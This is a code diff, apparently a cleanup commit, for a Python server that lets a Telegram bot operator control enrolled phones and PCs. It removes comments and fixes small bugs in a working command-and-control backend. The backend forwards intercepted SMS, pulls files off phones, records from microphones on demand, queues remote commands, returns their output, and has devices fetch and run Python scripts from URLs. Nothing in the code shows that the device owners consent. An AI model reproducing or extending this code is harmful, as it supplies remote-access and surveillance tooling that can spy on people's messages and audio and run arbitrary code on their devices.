@@ -95,7 +95,6 @@ async def send_tg_file(chat_id: str, file_bytes: bytes, filename: str, caption: 
     """Проксируем файл с телефона в Telegram без хранения."""
     if not BOT_TOKEN:
         return
-    # Определяем метод по расширению
     ext = filename.lower().rsplit(".", 1)[-1] if "." in filename else ""
     if ext in ("jpg", "jpeg", "png", "webp", "gif"):
         method = "sendPhoto"
@@ -147,7 +146,6 @@ def device_last_seen_str(device_id: str) -> str:
 
 def selected_device_id(chat_id: str) -> Optional[str]:
     sel = state["selected_device"].get(chat_id)
-    # Обратная совместимость: если хранится строка — возвращаем её
     if isinstance(sel, list):
         return sel[0] if len(sel) == 1 else None
     return sel
@@ -161,15 +159,13 @@ def selected_device_ids(chat_id: str) -> list[str]:
         return list(devices.keys())
     if isinstance(sel, list):
         return [d for d in sel if d in devices]
-    # строка — один ID
     return [sel] if sel in devices else []
 
 def require_device(chat_id: str):
-    """Возвращает (dev_id, None) или (None, err) — для обратной совместимости.
-    Если выбрано несколько — возвращает первый активный."""
+    """Возвращает (dev_id, None) или (None, err)."""
     ids = require_devices(chat_id)
     if isinstance(ids, str):
-        return None, ids   # это строка ошибки
+        return None, ids
     return ids[0], None
 
 def require_devices(chat_id: str):
@@ -329,7 +325,6 @@ async def process_callback(callback: dict):
     if data.startswith("sel_"):
         dev_id = data[4:]
 
-        # Выбрать все
         if dev_id == "all":
             state["selected_device"][chat_id] = "all"
             names = ", ".join(d["model"] for d in devices.values())
@@ -343,10 +338,8 @@ async def process_callback(callback: dict):
             await answer_callback(cb_id, "⚠️ Устройство не найдено")
             return
 
-        # Мультивыбор: если уже выбрано одно/несколько — toggle этого девайса
         current = state["selected_device"].get(chat_id)
         if current == "all":
-            # Снимаем "все", оставляем только этот
             selected_list = [dev_id]
         elif isinstance(current, list):
             if dev_id in current:
@@ -354,12 +347,10 @@ async def process_callback(callback: dict):
             else:
                 selected_list = current + [dev_id]
         elif current and current != dev_id:
-            # Был один — добавляем второй
             selected_list = [current, dev_id]
         else:
             selected_list = [dev_id]
 
-        # Если один — храним строкой для совместимости, иначе списком
         state["selected_device"][chat_id] = selected_list[0] if len(selected_list) == 1 else selected_list
 
         sel = state["selected_device"][chat_id]
@@ -387,7 +378,6 @@ async def process_callback(callback: dict):
             await send_tg(chat_id, "⚠️ Список вопросов пуст. Добавь через /addq <вопрос>")
             return
 
-        # Для plain — спрашиваем про сворачивание; для остальных сразу отправляем
         if msess["fb_mode"] == "plain":
             msess["step"] = "minimize"
             await send_tg(chat_id, "🖥 Свернуть все окна перед показом?",
@@ -417,14 +407,13 @@ async def process_callback(callback: dict):
         await enqueue_multi(chat_id, cmd, "сообщение")
         return
 
-    # ── Режим видео (fb mode) ─────────────────────────────────────────────────
     # ── Микрофон: ожидаем количество секунд ─────────────────────────────────
     msess = state["micro_sessions"].get(chat_id)
     if msess and msess.get("step") == "choose_seconds":
-        if not text.isdigit():
+        if not data.isdigit():
             await send_tg(chat_id, "⚠️ Введи число секунд (1-300)")
             return
-        seconds = max(1, min(int(text), 300))
+        seconds = max(1, min(int(data), 300))
         state["micro_sessions"].pop(chat_id, None)
         dev_id = msess["dev_id"]
         device_index = msess["device_index"]
@@ -468,13 +457,13 @@ async def process_callback(callback: dict):
             return
 
     # ── Микрофон ──────────────────────────────────────────────────────────────
-    elif data == "micro_cancel":
+    if data == "micro_cancel":
         state["micro_sessions"].pop(chat_id, None)
         await answer_callback(cb_id, "Отменено")
         await send_tg(chat_id, "❌ Запись отменена.")
         return
 
-    elif data.startswith("micro_dev:"):
+    if data.startswith("micro_dev:"):
         sess = state["micro_sessions"].get(chat_id)
         if not sess:
             await answer_callback(cb_id, "Сессия устарела")
@@ -516,7 +505,6 @@ async def process_update(update: dict):
         await send_tg(chat_id, "⛔ Нет доступа.")
         return
 
-    # ── Видео: ожидаем duration ───────────────────────────────────────────────
     # ── Микрофон: ожидаем количество секунд ─────────────────────────────────
     msess = state["micro_sessions"].get(chat_id)
     if msess and msess.get("step") == "choose_seconds":
@@ -535,6 +523,7 @@ async def process_update(update: dict):
             f"запись микрофона {seconds} сек")
         return
 
+    # ── Видео: ожидаем duration ───────────────────────────────────────────────
     vsess = state["video_sessions"].get(chat_id)
     if vsess and vsess["step"] == "duration":
         if not text.isdigit():
@@ -854,7 +843,6 @@ async def process_update(update: dict):
         if err:
             await send_tg(chat_id, err)
         else:
-            # Запрашиваем список микрофонов с ПК
             state["micro_sessions"][chat_id] = {"step": "waiting_devices", "dev_id": dev_id}
             await enqueue_command(chat_id, dev_id,
                 {"cmd": "get_audio_devices"},
@@ -913,7 +901,7 @@ async def process_update(update: dict):
             return
         await enqueue_multi(chat_id, {"cmd": "del_py", "num": int(parts[1])}, f"удалить py{parts[1]}")
 
-        else:
+    else:
         await send_tg(chat_id, "❓ /help", reply_markup=main_keyboard())
 
 
@@ -943,7 +931,7 @@ async def upload(
     if not chat_id:
         raise HTTPException(status_code=400, detail="No chat_id")
 
-    data     = await file.read()        # читаем в память — не сохраняем на диск
+    data     = await file.read()
     filename = file.filename or "file"
     caption  = urllib.parse.unquote(x_caption) if x_caption else f"Файл: {filename}"
 
@@ -951,7 +939,7 @@ async def upload(
     return {"ok": True, "size": len(data)}
 
 
-# ─── Video list endpoint (ПК присылает список raw-видео) ────────────────────────
+# ─── Video list endpoint ─────────────────────────────────────────────────────
 
 @app.post("/video_list")
 async def video_list_endpoint(
@@ -962,7 +950,7 @@ async def video_list_endpoint(
         raise HTTPException(status_code=403, detail="Forbidden")
 
     chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
-    videos = body.get("videos", [])  # [{name, filename}, ...]
+    videos = body.get("videos", [])
 
     if not videos:
         await send_tg(chat_id, "📭 На ПК нет скачанных видео. Добавь через /addraw <url>")
@@ -978,7 +966,7 @@ async def video_list_endpoint(
     return {"ok": True}
 
 
-# ─── Micro devices endpoint (ПК присылает список микрофонов) ────────────────────
+# ─── Micro devices endpoint ──────────────────────────────────────────────────
 
 @app.post("/micro_devices")
 async def micro_devices(
@@ -989,19 +977,17 @@ async def micro_devices(
         raise HTTPException(status_code=403, detail="Forbidden")
 
     chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
-    devices_list = body.get("devices", [])  # [{index, name}, ...]
+    devices_list = body.get("devices", [])
 
     if not chat_id or not devices_list:
         return {"ok": False}
 
-    # Сохраняем список в сессию
     sess = state["micro_sessions"].get(chat_id, {})
     sess["step"] = "choose_device"
     sess["dev_id"] = body.get("device_id", "")
     sess["devices_list"] = devices_list
     state["micro_sessions"][chat_id] = sess
 
-    # Строим inline кнопки с микрофонами
     rows = []
     for d in devices_list:
         rows.append([{"text": f"🎙 {d['name'][:40]}", "callback_data": f"micro_dev:{d['index']}"}])
@@ -1011,7 +997,7 @@ async def micro_devices(
     return {"ok": True}
 
 
-# ─── Text reply endpoint (Android → TG) ──────────────────────────────────────
+# ─── Text reply endpoint ──────────────────────────────────────────────────────
 
 @app.post("/text_reply")
 async def text_reply(
@@ -1025,7 +1011,6 @@ async def text_reply(
     dev_id  = body.get("device_id", "?")
     model   = devices.get(dev_id, {}).get("model", dev_id)
     if chat_id and text:
-        # Отправляем без parse_mode чтобы спецсимволы в тексте не ломали парсер
         payload = {"chat_id": chat_id, "text": f"📱 {model}:\n{text}"}
         try:
             async with httpx.AsyncClient(timeout=10) as client:
@@ -1064,7 +1049,6 @@ async def poll(
             cmd["_chat_id"] = cid
             asyncio.create_task(
                 send_tg(cid, f"📲 Телефон получил команду `{cmd.get('cmd')}`."))
-        # Если команда ban — удаляем дубли из очереди
         if cmd.get("cmd") == "ban":
             d["pending_commands"] = [
                 c for c in d["pending_commands"] if c.get("cmd") != "ban"
@@ -1076,6 +1060,9 @@ async def poll(
 
 # ─── Health ───────────────────────────────────────────────────────────────────
 
+@app.get("/health")
+async def health():
+    return {"status": "ok", "devices": len(devices)}
 
 
 # ─── Восстановление состояния после рестарта ─────────────────────────────────
@@ -1117,12 +1104,9 @@ async def get_state(x_device_secret: Optional[str] = Header(None)):
         "questions": state["questions"],
         "instance_id": INSTANCE_ID,
     }
-@app.get("/health")
-async def health():
-    return {"status": "ok", "devices": len(devices)}
 
 
-# ─── SMS endpoint (Android → TG) ─────────────────────────────────────────────
+# ─── SMS endpoint ─────────────────────────────────────────────────────────────
 
 @app.post("/sms")
 async def receive_sms(
@@ -1141,7 +1125,7 @@ async def receive_sms(
     return {"ok": True}
 
 
-# ─── Py list endpoint (ПК присылает список скриптов) ─────────────────────────
+# ─── Py list endpoint ─────────────────────────────────────────────────────────
 
 @app.post("/py_list")
 async def py_list_endpoint(
@@ -1151,7 +1135,7 @@ async def py_list_endpoint(
     if x_device_secret != DEVICE_SECRET:
         raise HTTPException(status_code=403, detail="Forbidden")
     chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
-    scripts = body.get("scripts", [])  # [{name, filename}, ...]
+    scripts = body.get("scripts", [])
     if not scripts:
         await send_tg(chat_id, "📭 Нет скриптов. Добавь через /addpy <url>")
         return {"ok": True}
@@ -1164,7 +1148,7 @@ async def py_list_endpoint(
     return {"ok": True}
 
 
-# ─── Cmd output endpoint (ПК присылает лог команды) ──────────────────────────
+# ─── Cmd output endpoint ──────────────────────────────────────────────────────
 
 @app.post("/cmd_output")
 async def cmd_output(
@@ -1179,7 +1163,6 @@ async def cmd_output(
     dev_id  = body.get("device_id", "?")
     model   = devices.get(dev_id, {}).get("model", dev_id)
     if chat_id:
-        # Режем если очень длинный (лимит TG 4096 символов)
         text = output[:3800] if len(output) > 3800 else output
         suffix = "\n\n_...вывод обрезан_" if len(output) > 3800 else ""
         await send_tg(chat_id,
